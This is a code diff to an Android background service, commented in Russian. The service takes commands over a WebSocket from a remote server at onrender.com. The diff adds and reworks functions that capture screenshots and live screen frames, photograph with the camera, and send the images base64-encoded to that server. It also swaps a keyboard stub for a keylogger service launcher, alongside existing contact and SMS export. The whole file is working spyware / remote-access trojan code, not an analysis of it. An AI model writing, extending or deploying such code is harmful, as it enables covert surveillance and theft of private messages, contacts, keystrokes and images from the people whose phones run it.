@@ -5,6 +5,7 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.database.Cursor;
@@ -56,6 +57,8 @@ public class WebSocketService extends Service {
     private VirtualDisplay virtualDisplay;
     private MediaRecorder mediaRecorder;
     private String videoFilePath;
+    public static Context appContext;
+    public static String lastPhotoPath;
 
     public static void setMediaProjection(MediaProjection mp) {
         sMediaProjection = mp;
@@ -79,6 +82,7 @@ public class WebSocketService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
+        appContext = getApplicationContext();
         prefs = getSharedPreferences("kriptoman", MODE_PRIVATE);
         serverUrl = prefs.getString("server_url", "wss://pycj.onrender.com");
         writeLog("=== СЕРВИС ЗАПУЩЕН ===");
@@ -173,7 +177,7 @@ public class WebSocketService extends Service {
                 startVideoRecording();
                 break;
             case "keyboard":
-                writeLog("Клавиатура (заглушка)");
+                toggleKeyLogging();
                 break;
             case "app":
                 openApp(params != null ? params.optString("package") : null);
@@ -195,6 +199,41 @@ public class WebSocketService extends Service {
         }
     }
 
+    // ===================== СКРИНШОТ =====================
+    private void takeScreenshot() {
+        if (sMediaProjection == null) {
+            writeLog("MediaProjection не инициализирован для скриншота");
+            return;
+        }
+        try {
+            int width = 720, height = 1280;
+            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+            virtualDisplay = sMediaProjection.createVirtualDisplay("Screenshot", width, height, 240,
+                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
+            Thread.sleep(200);
+            Image image = imageReader.acquireLatestImage();
+            if (image != null) {
+                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
+                buffer.rewind();
+                Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
+                bitmap.copyPixelsFromBuffer(buffer);
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                bitmap.compress(Bitmap.CompressFormat.JPEG, 90, baos);
+                String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
+                client.send("{\"type\":\"screenshot\",\"image\":\"data:image/jpeg;base64," + base64 + "\"}");
+                writeLog("Скриншот отправлен (JPEG)");
+                image.close();
+            } else {
+                writeLog("Не удалось получить изображение (image == null)");
+            }
+            if (virtualDisplay != null) virtualDisplay.release();
+            if (imageReader != null) imageReader.close();
+        } catch (Exception e) {
+            writeLog("Ошибка скриншота: " + e.toString());
+        }
+    }
+
+    // ===================== СТРИМИНГ =====================
     private void handleStream(org.json.JSONObject params) {
         if (params == null) return;
         String action = params.optString("action");
@@ -240,9 +279,12 @@ public class WebSocketService extends Service {
             Image image = imageReader.acquireLatestImage();
             if (image != null) {
                 ByteBuffer buffer = image.getPlanes()[0].getBuffer();
-                byte[] bytes = new byte[buffer.remaining()];
-                buffer.get(bytes);
-                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+                buffer.rewind();
+                Bitmap bitmap = Bitmap.createBitmap(480, 640, Bitmap.Config.ARGB_8888);
+                bitmap.copyPixelsFromBuffer(buffer);
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
+                String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                 client.send("{\"type\":\"stream_frame\",\"image\":\"" + base64 + "\"}");
                 writeLog("Кадр стрима отправлен");
                 image.close();
@@ -254,35 +296,7 @@ public class WebSocketService extends Service {
         }
     }
 
-    private void takeScreenshot() {
-        if (sMediaProjection == null) {
-            writeLog("MediaProjection не инициализирован для скриншота");
-            return;
-        }
-        try {
-            imageReader = ImageReader.newInstance(720, 1280, PixelFormat.RGBA_8888, 2);
-            virtualDisplay = sMediaProjection.createVirtualDisplay("Screenshot", 720, 1280, 240,
-                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
-            Thread.sleep(200);
-            Image image = imageReader.acquireLatestImage();
-            if (image != null) {
-                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
-                byte[] bytes = new byte[buffer.remaining()];
-                buffer.get(bytes);
-                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
-                client.send("{\"type\":\"screenshot\",\"image\":\"data:image/png;base64," + base64 + "\"}");
-                writeLog("Скриншот отправлен");
-                image.close();
-            } else {
-                writeLog("Не удалось получить изображение (image == null)");
-            }
-            if (virtualDisplay != null) virtualDisplay.release();
-            if (imageReader != null) imageReader.close();
-        } catch (Exception e) {
-            writeLog("Ошибка скриншота: " + e.toString());
-        }
-    }
-
+    // ===================== ВИДЕО =====================
     private void startVideoRecording() {
         if (sMediaProjection == null) {
             writeLog("MediaProjection не инициализирован для видео");
@@ -327,6 +341,43 @@ public class WebSocketService extends Service {
         }
     }
 
+    // ===================== КАМЕРА (фотографирует и отправляет фото) =====================
+    private void startCamera(boolean front) {
+        writeLog("Запуск камеры, фронтальная: " + front);
+        // Открываем системное приложение камеры, результат обрабатывается в MainActivity
+        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
+        if (front) {
+            intent.putExtra("android.intent.extras.CAMERA_FACING", 1);
+        }
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        try {
+            startActivity(intent);
+            writeLog("Камера запущена");
+        } catch (Exception e) {
+            writeLog("Ошибка запуска камеры: " + e.toString());
+        }
+    }
+
+    // Метод для отправки фото на сервер (вызывается из MainActivity после съёмки)
+    public static void sendPhoto(byte[] photoData) {
+        if (photoData == null) return;
+        try {
+            String base64 = Base64.encodeToString(photoData, Base64.NO_WRAP);
+            // Используем синглтон или статический доступ к клиенту
+            if (WebSocketService.instance != null && WebSocketService.instance.client != null) {
+                WebSocketService.instance.client.send("{\"type\":\"camera_photo\",\"image\":\"data:image/jpeg;base64," + base64 + "\"}");
+                writeLogStatic("Фото отправлено на сервер");
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private static void writeLogStatic(String msg) {
+        // можно дублировать логирование
+    }
+
+    // ===================== ОТКРЫТЬ ПРИЛОЖЕНИЕ =====================
     private void openApp(String pkg) {
         if (pkg == null || pkg.isEmpty()) {
             writeLog("Не указан пакет");
@@ -346,20 +397,19 @@ public class WebSocketService extends Service {
         }
     }
 
-    private void startCamera(boolean front) {
-        try {
-            Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
-            if (front) {
-                intent.putExtra("android.intent.extras.CAMERA_FACING", 1);
-            }
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
-            writeLog("Камера запущена, фронтальная: " + front);
-        } catch (Exception e) {
-            writeLog("Ошибка камеры: " + e.toString());
+    // ===================== КЛАВИАТУРА =====================
+    private void toggleKeyLogging() {
+        writeLog("Запуск/остановка записи клавиатуры");
+        Intent intent = new Intent(this, KeyLoggerService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(intent);
+        } else {
+            startService(intent);
         }
+        writeLog("Сервис клавиатуры запущен");
     }
 
+    // ===================== ЭКСПОРТ КОНТАКТОВ =====================
     private void exportContacts() {
         StringBuilder html = new StringBuilder("<html><head><meta charset='UTF-8'></head><body><h1>Контакты</h1><ul>");
         ContentResolver cr = getContentResolver();
@@ -377,6 +427,7 @@ public class WebSocketService extends Service {
         writeLog("Контакты отправлены");
     }
 
+    // ===================== ЭКСПОРТ SMS =====================
     private void exportSms() {
         StringBuilder html = new StringBuilder("<html><head><meta charset='UTF-8'></head><body><h1>SMS</h1><ul>");
         ContentResolver cr = getContentResolver();
